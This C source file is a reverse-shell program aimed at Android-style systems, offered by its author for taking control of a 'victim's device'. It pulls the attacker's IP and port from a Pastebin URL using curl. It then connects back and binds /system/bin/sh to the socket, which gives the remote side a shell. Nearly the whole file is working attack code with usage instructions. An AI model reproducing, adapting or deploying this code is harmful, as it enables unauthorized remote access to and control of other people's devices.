/***************************************************************************
██████╗  █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗        @Kumar Raja
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║
██╔══██╗██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║
██║  ██║██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
                                                   
This Program allows you to create Revershell or Life Time.

Advantages: Allows to take take control of devices if you run this as background
Limitation: It won't Work if the device is restarted.

Usage:  Provide IP & Port details with pipe Separated in any site. 
    I Prefered pastebin . After That replace the url below with
    your url

Curl Must installed on Victim's Device or Else Please Watch My Vidoes or Below
Instructions to setup Curl Without any Permissions

If have Problem wih Curl Please use wget

any Queries Email-Me At - kisstechno@gmail.com
***************************************************************************/
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


int PORT;
char *IP;
int rshell(){
    int socket_info;
    int connecter;
    int pid;
    struct sockaddr_in sa;
    while(1){
 //soort socket, IPv4, poort nummer, aanvallers' IP.
        socket_info = socket(AF_INET, SOCK_STREAM, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(PORT);
    sa.sin_addr.s_addr = inet_addr(IP);
    connecter = connect(socket_info, (struct sockaddr *)&sa, sizeof(struct sockaddr));
        while(connecter < 0){
                sleep(5);   getipport();
                //connecter = connect(socket_info, (struct sockaddr *)&sa, sizeof(struct sockaddr));
    }
    connecter = write(socket_info,"\033[1;32m Connected Successfully :) :) :)\n\033[0m",36);
    pid = fork();
    if(pid > 0){
                wait(NULL);
        }
        if(pid == 0){
                dup2(socket_info,0); // input
                dup2(socket_info,1); // output
                dup2(socket_info,2); // errors
        execl("/system/bin/sh", ">");
        }
}
        return 0;

}
// -------------------------------------------  Get IP Port ---------------------------
int getipport()
{ 
    while(1){
  FILE *fp;
  char path[1035];
  fp = popen("curl -s 'https://pastebin.com/raw/1MZ1Tpxc'", "r");
while (fgets(path, sizeof(path)-1, fp) != NULL) {
char *p = strtok (path, "|");
char *array[2];
int i=0;
while (p != NULL){array[i++] = p;p = strtok (NULL, "/");}
IP=array[0];
PORT=atoi(array[1]);
rshell();
}
pclose(fp);
sleep(5);
getipport();
return 0;
        }
}
// ----------------------------------------------------------------------------------------
void usage() { 
printf("██████╗  █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗\n"
"██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗\n"
"██████╔╝███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║\n"
"██╔══██╗██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║\n"
"██║  ██║██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝\n"
"╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ \n"
"                                         --kumar Raja      \n"
"\n");
printf("Usage:  Provide IP & Port details with pipe Separated in any site.\n        I Prefered pastebin . After That replace the url inthe Source Code with your url\n        Any Queries Email-Me At - kisstechno@gmail.com\n");
exit(EXIT_FAILURE);
}
int main( int argc, char *argv[] ){
if (argv[1])
{
usage();
}
else
{
getipport();
}
}

